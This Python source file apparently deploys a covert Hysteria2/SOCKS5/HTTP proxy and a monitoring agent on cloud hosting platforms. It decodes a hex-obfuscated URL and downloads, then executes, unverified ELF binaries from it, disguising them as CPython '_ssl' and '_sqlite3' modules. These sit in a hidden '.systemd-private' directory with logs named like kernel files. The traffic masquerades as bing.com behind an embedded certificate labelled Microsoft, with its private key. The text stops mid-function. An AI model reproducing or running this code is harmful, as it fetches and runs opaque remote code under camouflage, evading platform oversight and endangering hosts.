import os, sys, json, re, time, uuid, base64, hashlib, random, socket, select, hmac, ssl
import struct, shutil, signal, platform, subprocess, tempfile, threading
import urllib.request, urllib.parse
import concurrent.futures as _cf
from pathlib import Path

for _st in (sys.stdout, sys.stderr):
    try:
        _st.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

__version__ = "1.2.3"
HARD = {}


def _d(h):
    return bytes.fromhex(h).decode()


S_MAIN = _d("687932")
S_S5 = _d("736f636b7335")
S_HT = _d("68747470")
NM = _d("6b6f6d617269")
AL_MON = (NM + "_URL", NM + "_ENDPOINT")
AL_TOK = (NM + "_TOKEN", NM + "_KEY")

UID_BAK = "a9c1f4e2-6d3b-4a70-9f52-1c8e5b7d0a34"
NODE_DEF = "Lumiere"
PORT_DEF = 8080
HOST_DEF = "0.0.0.0"
LB = "127.0.0.1"
DOMAINS = ("www.bing.com", "cdn.jsdelivr.net", "www.microsoft.com",
           "static.cloudflareinsights.com", "www.apple.com", "www.speedtest.net")
CAMOUFLAGE_DOMAINS = {d.lower() for d in DOMAINS} | {"bing.com", "microsoft.com", "apple.com"}


def _load_dotenv():
    for fn in ("config.env", ".env"):
        for root in (Path.cwd(), Path(__file__).resolve().parent if "__file__" in globals() else None):
            if not root:
                continue
            fp = root / fn
            if fp.is_file():
                try:
                    for line in fp.read_text(encoding="utf-8", errors="ignore").splitlines():
                        line = line.strip()
                        if not line or line.startswith("#") or "=" not in line:
                            continue
                        k, v = line.split("=", 1)
                        k = k.strip()
                        v = v.strip().strip('"').strip("'")
                        if k and k not in os.environ:
                            os.environ[k] = v
                except Exception:
                    pass

_load_dotenv()


def _tune_kernel_udp():
    """优化 Linux / 容器网络栈内核 UDP 接收/发送缓冲区，防止突发流量引发内核丢包与断流。"""
    if os.name == "nt":
        return
    for path, val in (("/proc/sys/net/core/rmem_max", "26214400"),
                     ("/proc/sys/net/core/wmem_max", "26214400"),
                     ("/proc/sys/net/core/rmem_default", "2621440"),
                     ("/proc/sys/net/core/wmem_default", "2621440")):
        try:
            p = Path(path)
            if p.is_file():
                p.write_text(val, encoding="utf-8")
        except (OSError, PermissionError):
            pass
    exe = shutil.which("sysctl")
    if exe:
        try:
            subprocess.run([exe, "-w", "net.core.rmem_max=26214400", "net.core.wmem_max=26214400"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        except Exception:
            pass
_A = _d("68747470733a2f2f7373722e636e2e6d742f66696c65732f")
CORE_URLS = {"x64": _A + "H_amd", "arm64": _A + "H_arm"}
AUX_URLS = {"x64": _A + "K_amd", "arm64": _A + "K_arm"}
PORT_ENVS = ("PORT", "SERVER_PORT", "WEBSITES_PORT", "APP_PORT", "INTERNAL_PORT",
             "PORT0", "X_PORT", "PORT_8080")
HOST_ENVS = ("SERVER_IP", "P_SERVER_IP", "NODE_IP", "PUBLIC_IP", "HOST_IP",
             "PANEL_IP", "EXTERNAL_IP", "PRIMARY_IP", "SERVER_HOST", "HOST",
             "HOSTNAME", "DOMAIN", "PUBLIC_DOMAIN", "PUBLIC_HOST", "CF_DOMAIN",
             "RAILWAY_PUBLIC_DOMAIN", "RENDER_EXTERNAL_HOSTNAME",
             "KOYEB_PUBLIC_DOMAIN", "ZEABUR_WEB_URL", "SPACE_HOST",
             "WEBSITE_HOSTNAME", "WEBSITES_HOSTNAME")
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
FSDIR = ".systemd-private-6b9e2f"
PEM_NAME = ".ca-certificates.crt"
KEY_NAME = "ssl-cert-snakeoil.key"
MAP_NAME = "direct_url.json"
RES_NAME = ".resolv.conf"
PORT_NAME = ".systemd-port"
_raw_sub = (os.environ.get("SUB_PATH") or "/zhkarc").strip()
if not _raw_sub.startswith("/"):
    _raw_sub = "/" + _raw_sub
SUB_PATH = _raw_sub
API_PATH, HEALTH_PATH = "/api/links", "/healthz"
SKIP_HEADERS = {"proxy-connection", "proxy-authorization", "connection"}
_SUB_TOKEN = (os.environ.get("SUB_TOKEN") or "").strip()
_API_TOKEN = (os.environ.get("API_TOKEN") or _SUB_TOKEN).strip()


def _tok_ok(given, expect):
    if not expect:
        return True
    return hmac.compare_digest(str(given or ""), str(expect))


try:
    _MAX_W = max(32, int(os.environ.get("MAX_CONN") or "128"))
except ValueError:
    _MAX_W = 128

try:
    _BUF_HIGH = max(262144, int(os.environ.get("PP_BUF_HIGH") or "1048576"))
except ValueError:
    _BUF_HIGH = 1048576

_CONN_SEM = threading.BoundedSemaphore(_MAX_W)
_POOL = _cf.ThreadPoolExecutor(max_workers=_MAX_W, thread_name_prefix="proxy")

_FALLBACK_PEM = """-----BEGIN CERTIFICATE-----
MIICizCCAhGgAwIBAgIUQgNH9BnVoqFOCJsOTTQFT4KzbswwCgYIKoZIzj0EAwMw
VzELMAkGA1UEBhMCVVMxHjAcBgNVBAoMFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEo
MCYGA1UEAwwfTWljcm9zb2Z0IFRMUyBHMiBFQ0MgQ0EgT0NTUCAwMjAgFw0yNjA2
MTIwNjUyMjFaGA8yMDk5MTIzMTA2NTIyMVowYzELMAkGA1UEBhMCVVMxCzAJBgNV
BAgMAldBMRAwDgYDVQQHDAdSZWRtb25kMR4wHAYDVQQKDBVNaWNyb3NvZnQgQ29y
cG9yYXRpb24xFTATBgNVBAMMDHd3dy5iaW5nLmNvbTB2MBAGByqGSM49AgEGBSuB
BAAiA2IABOsyEY4rbln+HOxBh/F30cdovipIvCZIstUJVsb7+VRdzVMoX15SWWOK
irBe8znUFEcbKLH1iZQz7UN9XMPxyzB/rWuFXUMS6Th/FIN2lInuh2OR6IdVHLRV
HTYqFmshUaOBjzCBjDAMBgNVHRMBAf8EAjAAMA4GA1UdDwEB/wQEAwIHgDATBgNV
HSUEDDAKBggrBgEFBQcDATAdBgNVHQ4EFgQU8b1wizTQvQ7dvRKIw53kiLKavKAw
HwYDVR0jBBgwFoAU3sT3ZSNVXoDBgl2mYq2IaPbqzsUwFwYDVR0RBBAwDoIMd3d3
LmJpbmcuY29tMAoGCCqGSM49BAMDA2gAMGUCMQDaTo5p/wFUzgfimKtw2FZI8pkQ
blC05aYqmZf5+NwEuiSxSwaCYSgzux8w6VTDa9sCMFx3zqIqgxrv8vvuhVLmeaWM
EsAHN+iPLKHZ65yqTjVw1CwcIwcakeXOojnEE7JCJg==
-----END CERTIFICATE-----

-----BEGIN CERTIFICATE-----
MIICVTCCAdugAwIBAgIUM973ToQzuTjoPiAqV43H6+tSqtowCgYIKoZIzj0EAwMw
VzELMAkGA1UEBhMCVVMxHjAcBgNVBAoMFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEo
MCYGA1UEAwwfTWljcm9zb2Z0IFRMUyBHMiBFQ0MgQ0EgT0NTUCAwMjAgFw0yNjA2
MTIwNjUyMjFaGA8yMDk5MTIzMTA2NTIyMVowVzELMAkGA1UEBhMCVVMxHjAcBgNV
BAoMFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEoMCYGA1UEAwwfTWljcm9zb2Z0IFRM
UyBHMiBFQ0MgQ0EgT0NTUCAwMjB2MBAGByqGSM49AgEGBSuBBAAiA2IABIhjvyat
IggBDUvm5qKvhQZp3PgHLaRTFshgi17TVBsIn/PVbalhUkb7USb6XIi6Gb06fFGq
xyJ76lgeY176/H14toda4CboDqv/gOaYlLp4n9HSxcSIrQMrbCUeNi3gnaNmMGQw
EgYDVR0TAQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAQYwHQYDVR0OBBYEFN7E
92UjVV6AwYJdpmKtiGj26s7FMB8GA1UdIwQYMBaAFN7E92UjVV6AwYJdpmKtiGj2
6s7FMAoGCCqGSM49BAMDA2gAMGUCMQDkn4STs+Stk6aHFZUuBbEhcBb71A4XXKwm
+0JSeXV29/9ZeO1l8QXFV2AtOcfqeloCMGhB15iNGZx1yqU/2X6vPrOuAO+GPiud
+ZLZeW1wF/iM8MEw3nyM7S1AtnSHZ1aVQQ==
-----END CERTIFICATE-----
"""

_FALLBACK_KEY = """-----BEGIN EC PRIVATE KEY-----
MIGkAgEBBDAmZ5436+m4K8MKeaJlqp+t5hB3Evf8YWC46e3qLP/lGfiAGy9tpe5m
YkVYKlVNXWagBwYFK4EEACKhZANiAATrMhGOK25Z/hzsQYfxd9HHaL4qSLwmSLLV
CVbG+/lUXc1TKF9eUlljioqwXvM51BRHGyix9YmUM+1DfVzD8cswf61rhV1DEuk4
fxSDdpSJ7odjkeiHVRy0VR02KhZrIVE=
-----END EC PRIVATE KEY-----
"""

_FALLBACK_PIN = "8e8f236a78378114dc97e198f8017482fcc66a9903565d2519c357a46c0d4a93"

_t0 = time.time()
STOP = threading.Event()
KIDS = []
LOCK = threading.Lock()
STATE = {"core": "off", "aux": "off", "ready": False, "ip": "", "sni": "", "cert": "", "links": b""}
WORK = None
CFG = {}
AUTH = True


def log(msg, lv="INFO"):
    print(f"[{time.strftime('%H:%M:%S')}] {lv:<5} {msg}", flush=True)


def env(name):
    return (os.environ.get(name) or "").strip().strip('"').strip("'")


def env_any(names):
    for n in names:
        v = env(n)
        if v:
            return v
    return ""


def C(key, dflt=""):
    return env(key) or str(HARD.get(key) or "") or dflt


def Ci(key, dflt):
    v = C(key)
    try:
        return int(v)
    except ValueError:
        return dflt


def ok_port(v):
    return bool(v) and str(v).isdigit() and 0 < int(v) < 65536


def arch():
    m = platform.machine().lower()
    if m in ("x86_64", "amd64", "x64"):
        return "x64"
    if m in ("aarch64", "arm64", "armv8l", "armv8"):
        return "arm64"
    return ""


def _quiet(p):
    try:
        p.chmod(0o600)
    except OSError:
        pass


def _is_elf(p):
    try:
        with open(p, "rb") as f:
            return f.read(4) == b"\x7fELF"
    except OSError:
        return False


def _is_pem(tag):
    def _c(p):
        try:
            with open(p, "rb") as f:
                return (b"-----BEGIN " + tag) in f.read(8192)
        except OSError:
            return False
    return _c


def _try_dir(p):
    try:
        p.mkdir(mode=0o700, exist_ok=True)
        probe = p / ".w"
        probe.write_text("1", encoding="utf-8")
        probe.unlink()
    except OSError:
        return False
    try:
        p.chmod(0o700)
    except OSError:
        pass
    return True


def _noexec(p):
    """挂在 noexec 的挂载点上，下载来的 .so 就算 chmod 700 也 exec 不起来。"""
    try:
        rp = str(Path(p).resolve())
    except OSError:
        rp = str(p)
    try:
        txt = Path("/proc/self/mounts").read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return False
    best, flag = "", False
    for line in txt.splitlines():
        f = line.split()
        if len(f) < 4 or not rp.startswith(f[1]):
            continue
        if len(f[1]) >= len(best):
            best, flag = f[1], ("noexec" in f[3].split(","))
    return flag


def resolve_workdir(wd):
    cands = []
    if wd:
        cands.append(Path(wd).expanduser())
    cands.append(Path.cwd() / FSDIR)
    cands.append(Path(tempfile.gettempdir()) / FSDIR)
    try:
        cands.append(Path.home() / ".cache" / FSDIR)
    except Exception:
        pass
    cands.append(Path("/data") / FSDIR)
    live = [c for c in cands if _try_dir(c)]
    for c in live:
        if not _noexec(c):
            return c
    if live:
        log(f"{live[0]} sits on a noexec mount, payload exec will fail", "WARN")
        return live[0]
    return Path(tempfile.mkdtemp(prefix=FSDIR + "-"))


def dl(url, dest, timeout=30, check=None):
    """tmp 用 .t 后缀，cleaner 靠 mtime 门槛避开在途下载。"""
    tmp = Path(str(dest) + ".t")
    try:
        rq = urllib.request.Request(url, headers=UA)
        with urllib.request.urlopen(rq, timeout=timeout) as r, open(tmp, "wb") as f:
            while True:
                c = r.read(65536)
                if not c:
                    break
                f.write(c)
        if tmp.exists() and tmp.stat().st_size > 0 and (check is None or check(tmp)):
            tmp.replace(dest)
            _quiet(dest)
            return True
    except Exception:
        pass
    try:
        tmp.unlink()
    except OSError:
        pass
    return False


def _argv_port():
    args = sys.argv[1:]
    for i, a in enumerate(args):
        for pat in (r"^--port=(\d+)$", r"^--port=.*?:(\d+)$"):
            m = re.match(pat, a)
            if m and ok_port(m.group(1)):
                return m.group(1)
        if a in ("-p", "--port") and i + 1 < len(args) and ok_port(args[i + 1]):
            return args[i + 1]
    return ""


def main_port():
    v = env("PROT")
    if ok_port(v):
        return int(v), "PROT"
    for k in PORT_ENVS:
        v = env(k)
        if ok_port(v):
            return int(v), k
    v = _argv_port()
    if ok_port(v):
        return int(v), "argv"
    v = str(HARD.get("PROT") or "")
    if ok_port(v):
        return int(v), "HARD"
    return PORT_DEF, "default"


def sub_port(key, main_p):
    v = C(key)
    return (int(v), True) if ok_port(v) else (main_p, False)


def safe_domain(d):
    v = str(d or "localhost").strip().strip('"').strip("'")[:253]
    return v if re.fullmatch(r"[A-Za-z0-9.\-*]+", v) else "localhost"


def gen_self_signed(dom, ca, ka):
    exe = shutil.which("openssl")
    if not exe:
        return False
    head = [exe, "req", "-x509", "-nodes", "-days", "36500", "-subj", f"/CN={dom}"]
    tail = ["-out", str(ca), "-keyout", str(ka)]
    tries = (head + ["-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1",
                     "-addext", f"subjectAltName=DNS:{dom}"] + tail,
             head + ["-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1"] + tail,
             head + ["-newkey", "rsa:2048", "-addext", f"subjectAltName=DNS:{dom}"] + tail)
    for cmd in tries:
        try:
            r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=40)
        except Exception:
            continue
        try:
            good = r.returncode == 0 and ca.stat().st_size > 64 and ka.stat().st_size > 64
        except OSError:
            good = False
        if good:
            _quiet(ca)
            _quiet(ka)
            return True
    return False


def cert_pin(ca, src):
    pin = C("PINSHA256")
    if pin:
        return pin
    if src == "builtin":
        return _FALLBACK_PIN
    try:
        pem = ca.read_text(encoding="utf-8", errors="ignore")
        first = pem.split("-----END CERTIFICATE-----")[0]
        b64 = "".join(l.strip() for l in first.splitlines() if not l.startswith("-----"))
        return hashlib.sha256(base64.b64decode(b64)).hexdigest()
    except Exception:
        return ""


def ensure_cert():
    dom = safe_domain(C("DOMAIN") or random.choice(DOMAINS))
    ca, ka = CFG["cert"], CFG["key"]
    src = ""
    uc, uk = C("CERT_URL"), C("KEY_URL")
    if uc and uk:
        have = (dl(uc, ca, 25, _is_pem(b"CERTIFICATE"))
                and dl(uk, ka, 25, _is_pem(b"PRIVATE KEY")))
        if have:
            src = "download"
    if not src and gen_self_signed(dom, ca, ka):
        src = "self-signed"
    if not src:
        try:
            ca.write_text(_FALLBACK_PEM.strip(), encoding="utf-8")
            ka.write_text(_FALLBACK_KEY.strip(), encoding="utf-8")
        except OSError as e:
            log(f"cert write failed: {e}", "ERROR")
            return False
        _quiet(ca)
        _quiet(ka)
        src = "builtin"
    CFG["sni"], CFG["cert_src"] = dom, src
    CFG["pin"] = cert_pin(ca, src)
    STATE["sni"], STATE["cert"] = dom, src
    log(f"cert ready: {src} sni={dom}")
    return True


def g_bin(kind):
    a = arch()
    if not a:
        log(f"arch {platform.machine()} unsupported", "ERROR")
        return None
    url = (CORE_URLS if kind == "c" else AUX_URLS)[a]
    tag = "_ssl" if kind == "c" else "_sqlite3"
    bp = WORK / f"{tag}.cpython-311-{a}-linux-gnu.so"
    pt = re.compile(r"^%s\.cpython-\d+.*\.so$" % tag)
    try:
        names = os.listdir(WORK)
    except OSError:
        names = []
    for n in names:
        if pt.match(n):
            fp = WORK / n
            if not _is_elf(fp):
                try:
                    fp.unlink()
                except OSError:
                    pass
                continue
            if not os.access(fp, os.X_OK):
                try:
                    fp.chmod(0o700)
                except OSError:
                    pass
            return fp
    tp = Path(str(bp) + ".t")
    for n in names:
        if pt.match(n) and n != bp.name:
            try:
                (WORK / n).unlink()
            except OSError:
                pass
    try:
        WORK.mkdir(parents=True, exist_ok=True)
        rq = urllib.request.Request(url, headers=UA)
        with urllib.request.urlopen(rq, timeout=90) as r, open(tp, "wb") as f:
            while True:
                c = r.read(65536)
                if not c:
                    break
                f.write(c)
        size = tp.stat().st_size if tp.exists() else 0
        if size > 1024 and _is_elf(tp):
            tp.chmod(0o700)
            tp.replace(bp)
            log(f"{'runtime' if kind == 'c' else 'agent'} ready: {bp.name} {size // 1024} KB")
            return bp
        log(f"payload rejected: {size} bytes elf={_is_elf(tp)}", "ERROR")
    except Exception as e:
        log(f"fetch failed: {e}", "ERROR")
    try:
        tp.unlink()
    except OSError:
        pass
    return None


def write_cfg():
    """生成工业级防断流 Hysteria 2 配置文件。

    防断流核心工程设计：
      1. PMTU 黑洞规避 (disablePathMTUDiscovery=True)：
         容器/Docker bridge/移动蜂窝网常丢弃 ICMP "Packet Too Big"。
         关闭 PMTU 探测，强制使用 QUIC 基线安全包长（~1200 字节），杜绝“握手成功但传输卡死断流”。
      2. 拥塞控制与抗 QoS 限速 (BBR vs Brutal 动态自适应)：
         - 默认走 BBR 拥塞控制 (ignoreClientBandwidth=True)：BBR 动态感知 RTT 与链路状况，
           平滑发包，彻底避免固定速率 Brutal 模式洪水发包触发国内运营商 (电信/联通) UDP 突发限速与黑洞封禁。
         - 若显式配置 BANDWIDTH_UP / BANDWIDTH_DOWN 或 HY2_MODE=brutal，则启用 Brutal 模式并声明带宽，
           同时严格排除 ignoreClientBandwidth，彻底杜绝两项互斥导致的进程闪退 (FATAL exit 1)。
      3. 空闲与状态超时放宽 (maxIdleTimeout / udpIdleTimeout=60s)：
         防止移动端切后台、熄屏或短暂网络切换导致 QUIC 会话被服务端过早拆除。
      4. 窗口吞吐保障：
         流与连接接收窗口扩展至 8MB / 20MB，支撑高并发连接与突发下载不丢包。
    """
    quic_idle = C("QUIC_IDLE", "60s").strip() or "60s"
    udp_idle = C("UDP_IDLE", "60s").strip() or "60s"
    cf = {
        "listen": f":{CFG['hport']}",
        "tls": {"cert": str(CFG["cert"]), "key": str(CFG["key"])},
        "auth": {"type": "password", "password": CFG["uid"]},
        "quic": {
            "initStreamReceiveWindow": 8388608,
            "maxStreamReceiveWindow": 8388608,
            "initConnReceiveWindow": 20971520,
            "maxConnReceiveWindow": 20971520,
            "maxIdleTimeout": quic_idle,
            "maxIncomingStreams": 1024,
            "disablePathMTUDiscovery": True,
        },
        "disableUDP": Ci("UDP_ENABLE", 1) != 1,
        "udpIdleTimeout": udp_idle,
        "masquerade": {
            "type": "proxy",
            "proxy": {
                "url": C("MASQ_URL", "https://www.bing.com/"),
                "rewriteHost": True
            }
        } if C("MASQ_TYPE", "proxy") == "proxy" else {"type": "404"},
    }

    bw_up = C("BANDWIDTH_UP") or C("HY2_UP")
    bw_down = C("BANDWIDTH_DOWN") or C("HY2_DOWN")
    force_brutal = C("HY2_MODE", "").lower() == "brutal" or bool(bw_up and bw_down)

    if force_brutal:
        up_val = bw_up or "1 gbps"
        down_val = bw_down or "1 gbps"
        cf["bandwidth"] = {"up": up_val, "down": down_val}
    else:
        cf["ignoreClientBandwidth"] = True

    WORK.mkdir(parents=True, exist_ok=True)
    CFG["cfg"].write_text(json.dumps(cf, indent=2), encoding="utf-8")
    _quiet(CFG["cfg"])
    return CFG["cfg"]


def core_cmd():
    bp = g_bin("c")
    if not bp:
        return None
    if not CFG["cert"].exists() or not CFG["key"].exists():
        if ensure_cert():
            # 重签之后指纹变了，订阅里的 pinSHA256 跟着刷一遍，否则已分发客户端全线报 TLS 错
            _publish(STATE.get("ip") or _endpoint_ip())
            log("cert rotated, subscription refreshed", "WARN")
    write_cfg()
    return [str(bp), "server", "-c", str(CFG["cfg"])]


def aux_cmd():
    bp = g_bin("a")
    if not bp:
        return None
    return [str(bp), "-e", CFG["endpoint"], "-t", CFG["token"]]


def _tail(tag):
    fp = WORK / ("kmsg" if tag == "core" else "dmesg")
    try:
        data = fp.read_bytes()[-600:]
    except OSError:
        return ""
    lines = [ln for ln in data.decode("utf-8", "ignore").splitlines() if ln.strip()]
    return " | ".join(lines[-3:])[:400]


def spawn(fn, tag, slot):
    def loop():
        delay = 2
        while not STOP.is_set():
            cmd = None
            began = time.time()
            try:
                cmd = fn()
            except Exception as e:
                log(f"{tag} prepare failed: {e}", "ERROR")
            if not cmd:
                STATE[slot] = "unavailable"
            else:
                p = None
                sink = None
                STATE[slot] = "starting"
                try:
                    try:
                        WORK.mkdir(parents=True, exist_ok=True)
                        fp = WORK / ("kmsg" if tag == "core" else "dmesg")
                        if fp.exists() and fp.stat().st_size > 262144:
                            fp.unlink()
                        sink = open(fp, "ab", buffering=0)
                    except OSError:
                        sink = open(os.devnull, "wb")
                    p = subprocess.Popen(cmd, stdout=sink, stderr=sink,
                                         cwd=str(WORK), start_new_session=True)
                    with LOCK:
                        KIDS.append(p)
                    STATE[slot] = "running"
                    STATE[slot + "_since"] = time.time()
                    log(f"{tag} pid={p.pid}")
                    rc = p.wait()
                    STATE[slot] = f"exit {rc}"
                    STATE[slot + "_since"] = 0
                    if rc:
                        log(f"{tag} exit {rc}: {_tail(tag)}", "WARN")
                    else:
                        log(f"{tag} exit {rc}", "WARN")
                except Exception as e:
                    STATE[slot] = "start failed"
                    log(f"{tag} start failed: {e}", "ERROR")
                finally:
                    if sink is not None:
                        try:
                            sink.close()
                        except OSError:
                            pass
                    if p is not None:
                        with LOCK:
                            if p in KIDS:
                                KIDS.remove(p)
            ran = time.time() - began
            if ran > 60:
                delay = 2
            if STOP.is_set():
                break
            time.sleep(delay)
            delay = 2 if ran > 60 else min(30, delay * 2)
    threading.Thread(target=loop, daemon=True).start()


def norm_endpoint(raw):
    s = (raw or "").strip().strip('"').strip("'")
    if not s:
        return ""
    m = re.search(r"https?://[^\s'\"`|]+", s)
    if m:
        s = m.group(0)
    if not s.startswith(("http://", "https://")):
        s = "https://" + s.lstrip("/")
    p = urllib.parse.urlsplit(s)
    if not p.netloc:
        return ""
    path = p.path.rstrip("/")
    for tail in ("/install.sh", "/get.sh", "/install.ps1", "/install", "/i.sh"):
        if path.endswith(tail):
            path = path[:-len(tail)]
            break
    return urllib.parse.urlunsplit((p.scheme, p.netloc, path, "", ""))


def creds():
    raw = env_any(("MON_URL",) + AL_MON) or str(HARD.get("MON_URL") or "")
    tok = env_any(("MON_TOKEN",) + AL_TOK) or str(HARD.get("MON_TOKEN") or "")
    ep = raw
    if raw:
        me = re.search(r"(?:^|\s)(?:-e|--endpoint)[=\s]+(\S+)", raw)
        if me:
            ep = me.group(1)
        if not tok:
            mt = re.search(r"(?:^|\s)(?:-t|--token)[=\s]+(\S+)", raw)
            if mt:
                tok = mt.group(1).strip().strip('"').strip("'")
    return norm_endpoint(ep), tok


def _parse_panel_ep(v):
    if not v:
        return None, None
    s = str(v).strip().strip('"').strip("'")
    if "://" in s:
        s = s.split("://", 1)[1]
    s = s.rstrip("/")
    if not s:
        return None, None
    m_v6 = re.match(r"^\[([a-fA-F0-9:]+)\](?::(\d+))?$", s)
    if m_v6:
        h = m_v6.group(1)
        p = int(m_v6.group(2)) if m_v6.group(2) and ok_port(m_v6.group(2)) else None
        return h, p
    if ":" in s and s.count(":") == 1:
        parts = s.split(":", 1)
        h = parts[0].strip()
        p = int(parts[1]) if ok_port(parts[1]) else None
        return h, p
    return s, None


def _endpoint_ip():
    for k in HOST_ENVS:
        raw = env(k)
        if not raw:
            continue
        h, p = _parse_panel_ep(raw)
        if h and h.lower() not in ("0.0.0.0", "127.0.0.1", "localhost", "::", "::1"):
            if h.lower() in CAMOUFLAGE_DOMAINS:
                continue
            if k == "HOSTNAME" and ("." not in h and ":" not in h):
                continue
            if p:
                if not CFG.get("h_set"):
                    CFG["pub_hport"] = p
                if not CFG.get("s_set"):
                    CFG["pub_sport"] = p
            return h
    v = env("FLY_APP_NAME")
    if v:
        return f"{v}.fly.dev"
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            rq = urllib.request.Request(u, headers=UA)
            with urllib.request.urlopen(rq, timeout=6) as r:
                ip = r.read().decode().strip()
            if ip.count(".") == 3 and all(x.isdigit() for x in ip.split(".")):
                return ip
            if ip.count(":") >= 2:
                return ip
        except Exception:
            continue
    log("endpoint probe failed, fallback to loopback", "WARN")
    return LB


def _publish(ip):
    pwd = CFG["uid"]
    q = f"sni={CFG['sni']}&insecure=1&allowInsecure=1"
    if CFG.get("pin"):
        q += f"&pinSHA256={urllib.parse.quote(CFG['pin'])}"
    udp = CFG.get("pub_hport") or CFG["hport"]
    tcp = CFG.get("pub_sport") or CFG["sport"]
    node = CFG["node"]
    blob = b""
    if Ci("UDP_ENABLE", 1) == 1:
        blob += f"{S_MAIN}://{pwd}@{ip}:{udp}/?{q}#{node}\n".encode()
    blob += (f"{S_S5}://{pwd}:{pwd}@{ip}:{tcp}#{node}_S\n"
             f"{S_HT}://{pwd}:{pwd}@{ip}:{tcp}#{node}_H\n").encode()
    STATE["ip"], STATE["links"] = ip, blob
    if WORK:
        try:
            (WORK / RES_NAME).write_text(base64.b64encode(blob).decode(), encoding="utf-8")
        except OSError:
            pass
    return blob


def _rcv(s, n):
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except OSError:
            return None
        if not c:
            return None
        b += c
    return b


def _set_keepalive(s, idle=60, intvl=10, cnt=9):
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        pass
    for opt, val in (("TCP_KEEPIDLE", idle), ("TCP_KEEPINTVL", intvl), ("TCP_KEEPCNT", cnt)):
        if hasattr(socket, opt):
            try:
                s.setsockopt(socket.IPPROTO_TCP, getattr(socket, opt), val)
            except OSError:
                pass


_DNS_CACHE = {}
_DNS_LOCK = threading.Lock()
try:
    _DNS_TTL = max(1.0, float(os.environ.get("DNS_TTL") or "300"))
except ValueError:
    _DNS_TTL = 300.0
_DNS_CACHE_ON = os.environ.get("DNS_CACHE") != "0"


def cached_lookup(host):
    import ipaddress
    if not _DNS_CACHE_ON:
        return host
    try:
        ipaddress.ip_address(host)
        return host
    except ValueError:
        pass
    now = time.time()
    with _DNS_LOCK:
        hit = _DNS_CACHE.get(host)
        if hit and hit[0] > now:
            return hit[1]
    try:
        ip = socket.gethostbyname(host)
    except OSError:
        return host
    with _DNS_LOCK:
        _DNS_CACHE[host] = (now + _DNS_TTL, ip)
        if len(_DNS_CACHE) > 1000:
            stale = [k for k, v in _DNS_CACHE.items() if v[0] <= now][:100]
            for k in stale:
                _DNS_CACHE.pop(k, None)
    return ip


def _connect(host, port, timeout=10):
    return socket.create_connection((cached_lookup(host), port), timeout=timeout)


def _pp(a, b, idle_timeout=None):
    """双向中继。

    半关闭语义：
      eof[x]      = 从 x 收到了 FIN（x 侧停止发送），x 的【写】方向依旧可用；
      fin_want[x] = 欠对端一个半关闭，等 buf[x] 排空后再 shutdown(x, SHUT_WR)。
    只要 buf 里还有尾巴，那个 socket 就一直留在可写集合里，尾部数据一定会排空。

    非阻塞读写一律按 (BlockingIOError, SSLWantReadError, SSLWantWriteError) 收口：
    后者是 SSLError 的子类，走不到 BlockingIOError 那一支，漏了就会被当致命错误拆链。
    """
    if idle_timeout is None:
        raw = os.environ.get("PP_IDLE_TIMEOUT") or "0"
        try:
            idle_timeout = float(raw) if float(raw) > 0 else None
        except (TypeError, ValueError):
            idle_timeout = None
    for s in (a, b):
        try:
            s.setblocking(False)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            _set_keepalive(s)
            if hasattr(socket, "TCP_QUICKACK"):
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
                except OSError:
                    pass
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            except OSError:
                pass
        except OSError:
            pass
    wait_again = (BlockingIOError, ssl.SSLWantReadError, ssl.SSLWantWriteError)
    buf = {a: b"", b: b""}
    eof = {a: False, b: False}
    fin_want = {a: False, b: False}
    last_active = time.time()
    idle_rounds = 0
    try:
        while not STOP.is_set():
            wait_w = [s for s in (a, b) if buf.get(s)]
            wait_r = [s for s in (a, b)
                      if (not eof.get(s) and len(buf.get(b if s is a else a, b"")) < _BUF_HIGH)
                      or (hasattr(s, "pending") and s.pending())]
            if not wait_r and not wait_w:
                break
            try:
                readable, writable, _err = select.select(wait_r, wait_w, [], 15)
            except (OSError, ValueError):
                break
            idle = (not readable and not writable)
            # SSL 会把解密后的数据压在自己的缓冲里，select 那边看不到新数据，
            # 这里按 pending() 补一次，TLS 中继才不会隔一会儿才吐数据。
            if hasattr(a, "pending") or hasattr(b, "pending"):
                readable = list(readable)
                for s in (a, b):
                    if hasattr(s, "pending") and s.pending() and s not in readable:
                        readable.append(s)
            if not readable and not writable:
                if idle_timeout and time.time() - last_active > idle_timeout:
                    break
                continue
            if idle:
                idle_rounds += 1
                if idle_rounds > 20:
                    break          # pending() 报数却读不出内容时的保险丝，防热转
            else:
                idle_rounds = 0
            last_active = time.time()
            for s in writable:
                data = buf.get(s) or b""
                if not data:
                    if fin_want.get(s):
                        try:
                            s.shutdown(socket.SHUT_WR)
                        except OSError:
                            pass
                        fin_want[s] = False
                    continue
                try:
                    n = s.send(data)
                except wait_again:
                    continue
                except OSError:
                    return
                if n > 0:
                    buf[s] = data[n:]
                if not buf[s] and fin_want.get(s):
                    try:
                        s.shutdown(socket.SHUT_WR)
                    except OSError:
                        pass
                    fin_want[s] = False
            for s in readable:
                d = b if s is a else a
                try:
                    dt = s.recv(65536)
                except wait_again:
                    continue
                except OSError:
                    return
                if not dt:
                    eof[s] = True
                    fin_want[d] = True
                    if not buf.get(d):
                        try:
                            d.shutdown(socket.SHUT_WR)
                        except OSError:
                            pass
                        fin_want[d] = False
                    continue
                try:
                    n = d.send(dt)
